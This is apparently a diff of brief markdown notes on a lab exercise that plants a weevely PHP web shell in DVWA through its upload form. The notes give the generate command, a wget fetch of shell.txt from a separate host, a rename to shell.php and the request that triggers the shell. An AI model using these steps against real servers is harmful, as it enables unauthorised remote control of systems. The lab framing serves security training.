@@ -6,9 +6,10 @@
    -  ```weevely generate 123456 /root/shell.php```
 2. Upload 
    - we have an input field
-     -  Upload in vulnerable app (DVWA-Low)
+     -  Upload *"shell.php"* in vulnerable app (DVWA-Low)
    - we access to system shell
      - ```wget http://10.20.14.213/shell.txt``` 
+     - ```mv shell.txt shell.php```
 3. Run
    - Send a request to uploaded php file *"http://192.168.152.132/dvwa/hackable/uploads/shell.php"*
 4. Connect to shell from Kali
